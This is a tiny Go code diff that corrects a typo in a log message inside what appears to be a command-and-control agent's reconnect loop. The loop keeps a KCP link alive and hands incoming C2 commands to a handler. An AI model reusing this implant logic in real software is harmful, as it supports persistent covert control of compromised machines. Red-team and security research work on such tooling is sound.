@@ -307,7 +307,7 @@ connect:
 		goto connect
 	}
 	def.KCPKeep = true
-	log.Println("Connecting to CC NsgTun...")
+	log.Println("Connecting to CC MsgTun...")
 	c2transport.CCMsgTun(handler.HandleC2Command, ctx, cancel)
 	log.Printf("CC MsgTun closed, reconnecting")
 	goto connect
